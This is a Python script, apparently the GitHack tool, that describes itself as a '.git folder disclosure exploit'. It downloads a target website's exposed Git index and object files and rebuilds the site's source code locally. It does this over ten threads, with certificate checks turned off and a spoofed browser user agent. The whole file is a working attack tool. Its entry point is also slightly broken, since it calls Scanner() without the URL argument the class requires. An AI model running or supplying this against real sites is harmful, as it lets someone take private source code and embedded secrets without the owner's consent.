#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys
try:
    # python 2.x
    import urllib2
    import urlparse
    import Queue
except Exception as e:
    # python 3.x
    import urllib.request as urllib2
    import urllib.parse as urlparse
    import queue as Queue

import os
import zlib
import threading
import re
import time
import binascii
import collections
import mmap
import struct
import sys
import ssl

context = ssl._create_unverified_context()
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \
             'Chrome/99.0.4844.82 Safari/537.36'
print('Usage: python GitHack.py http://www.target.com/.git/')
def check(**kwargs):
    url = kwargs['url']
    s = Scanner(url)
    s.scan()
    try:
        while s.thread_count > 0:
            time.sleep(0.1)
    except KeyboardInterrupt as e:
        s.STOP_ME = True
        time.sleep(1.0)
        print('User Aborted.')

class Scanner(object):
    def __init__(self, url):
        self.base_url = url
        self.domain = urlparse.urlparse(url).netloc.replace(':', '_')
        print('[+] Download and parse index file ...')
        try:
            data = self._request_data(url + '/index')
        except Exception as e:
            print('[ERROR] index file download failed: %s' % str(e))
            exit(-1)
        with open('index', 'wb') as f:
            f.write(data)
        if not os.path.exists(self.domain):
            os.mkdir(self.domain)
        self.dest_dir = os.path.abspath(self.domain)
        self.queue = Queue.Queue()
        for entry in parse('index'):
            if "sha1" in entry.keys():
                entry_name = entry["name"].strip()
                if self.is_valid_name(entry_name):
                    self.queue.put((entry["sha1"].strip(), entry_name))
                    try:
                        print('[+] %s' % entry['name'])
                    except Exception as e:
                        pass

        self.lock = threading.Lock()
        self.thread_count = 10
        self.STOP_ME = False

    def is_valid_name(self, entry_name):
        if entry_name.find('..') >= 0 or \
                entry_name.startswith('/') or \
                entry_name.startswith('\\') or \
                not os.path.abspath(os.path.join(self.domain, entry_name)).startswith(self.dest_dir):
            try:
                print('[ERROR] Invalid entry name: %s' % entry_name)
            except Exception as e:
                pass
            return False
        return True

    @staticmethod
    def _request_data(url):
        request = urllib2.Request(url, None, {'User-Agent': user_agent})
        return urllib2.urlopen(request, context=context).read()

    def _print(self, msg):
        self.lock.acquire()
        try:
            print(msg)
        except Exception as e:
            pass
        self.lock.release()

    def get_back_file(self):
        while not self.STOP_ME:
            try:
                sha1, file_name = self.queue.get(timeout=0.5)
            except Exception as e:
                break
            for i in range(3):
                try:
                    folder = '/objects/%s/' % sha1[:2]
                    data = self._request_data(self.base_url + folder + sha1[2:])
                    try:
                        data = zlib.decompress(data)
                    except:
                        self._print('[Error] Fail to decompress %s' % file_name)
                    # data = re.sub(r'blob \d+\00', '', data)
                    try:
                        data = re.sub(r'blob \d+\00', '', data)
                    except Exception as e:
                        data = re.sub(b"blob \\d+\00", b'', data)
                    target_dir = os.path.join(self.domain, os.path.dirname(file_name))
                    if target_dir and not os.path.exists(target_dir):
                        os.makedirs(target_dir)
                    with open(os.path.join(self.domain, file_name), 'wb') as f:
                        f.write(data)
                    self._print('[OK] %s' % file_name)
                    break
                except urllib2.HTTPError as e:
                    if str(e).find('HTTP Error 404') >= 0:
                        self._print('[File not found] %s' % file_name)
                        break
                except Exception as e:
                    self._print('[Error] %s' % str(e))
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def scan(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.get_back_file)
            t.start()

def checkgit(boolean, message):
    if not boolean:
        import sys
        print("error: " + message)
        sys.exit(1)

def parse(filename, pretty=True):
    with open(filename, "rb") as o:
        f = mmap.mmap(o.fileno(), 0, access=mmap.ACCESS_READ)

        def read(format):
            # "All binary numbers are in network byte order."
            # Hence "!" = network order, big endian
            format = "! " + format
            bytes = f.read(struct.calcsize(format))
            return struct.unpack(format, bytes)[0]

        index = collections.OrderedDict()

        # 4-byte signature, b"DIRC"
        index["signature"] = f.read(4).decode("ascii")
        checkgit(index["signature"] == "DIRC", "Not a Git index file")

        # 4-byte version number
        index["version"] = read("I")
        checkgit(index["version"] in {2, 3},
            "Unsupported version: %s" % index["version"])

        # 32-bit number of index entries, i.e. 4-byte
        index["entries"] = read("I")

        yield index

        for n in range(index["entries"]):
            entry = collections.OrderedDict()

            entry["entry"] = n + 1

            entry["ctime_seconds"] = read("I")
            entry["ctime_nanoseconds"] = read("I")
            if pretty:
                entry["ctime"] = entry["ctime_seconds"]
                entry["ctime"] += entry["ctime_nanoseconds"] / 1000000000
                del entry["ctime_seconds"]
                del entry["ctime_nanoseconds"]

            entry["mtime_seconds"] = read("I")
            entry["mtime_nanoseconds"] = read("I")
            if pretty:
                entry["mtime"] = entry["mtime_seconds"]
                entry["mtime"] += entry["mtime_nanoseconds"] / 1000000000
                del entry["mtime_seconds"]
                del entry["mtime_nanoseconds"]

            entry["dev"] = read("I")
            entry["ino"] = read("I")

            # 4-bit object type, 3-bit unused, 9-bit unix permission
            entry["mode"] = read("I")
            if pretty:
                entry["mode"] = "%06o" % entry["mode"]

            entry["uid"] = read("I")
            entry["gid"] = read("I")
            entry["size"] = read("I")

            entry["sha1"] = binascii.hexlify(f.read(20)).decode("ascii")
            entry["flags"] = read("H")

            # 1-bit assume-valid
            entry["assume-valid"] = bool(entry["flags"] & (0b10000000 << 8))
            # 1-bit extended, must be 0 in version 2
            entry["extended"] = bool(entry["flags"] & (0b01000000 << 8))
            # 2-bit stage (?)
            stage_one = bool(entry["flags"] & (0b00100000 << 8))
            stage_two = bool(entry["flags"] & (0b00010000 << 8))
            entry["stage"] = stage_one, stage_two
            # 12-bit name length, if the length is less than 0xFFF (else, 0xFFF)
            namelen = entry["flags"] & 0xFFF

            # 62 bytes so far
            entrylen = 62

            if entry["extended"] and (index["version"] == 3):
                entry["extra-flags"] = read("H")
                # 1-bit reserved
                entry["reserved"] = bool(entry["extra-flags"] & (0b10000000 << 8))
                # 1-bit skip-worktree
                entry["skip-worktree"] = bool(entry["extra-flags"] & (0b01000000 << 8))
                # 1-bit intent-to-add
                entry["intent-to-add"] = bool(entry["extra-flags"] & (0b00100000 << 8))
                # 13-bits unused
                # used = entry["extra-flags"] & (0b11100000 << 8)
                # checkgit(not used, "Expected unused bits in extra-flags")
                entrylen += 2

            if namelen < 0xFFF:
                entry["name"] = f.read(namelen).decode("utf-8", "replace")
                entrylen += namelen
            else:
                # Do it the hard way
                name = []
                while True:
                    byte = f.read(1)
                    if byte == "\x00":
                        break
                    name.append(byte)
                entry["name"] = b"".join(name).decode("utf-8", "replace")
                entrylen += 1

            padlen = (8 - (entrylen % 8)) or 8
            nuls = f.read(padlen)
            checkgit(set(nuls) == set(['\x00']) or set(nuls) == set(b'\x00'), "padding contained non-NUL")
            
            yield entry
        f.close()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        msg = """
    A `.git` folder disclosure exploit. By LiJieJie

    Usage: python GitHack.py http://www.target.com/.git/
    """
        print(msg)
        sys.exit(0)
    s = Scanner()
    s.scan()
    try:
        while s.thread_count > 0:
            time.sleep(0.1)
    except KeyboardInterrupt as e:
        s.STOP_ME = True
        time.sleep(1.0)
        print('User Aborted.')
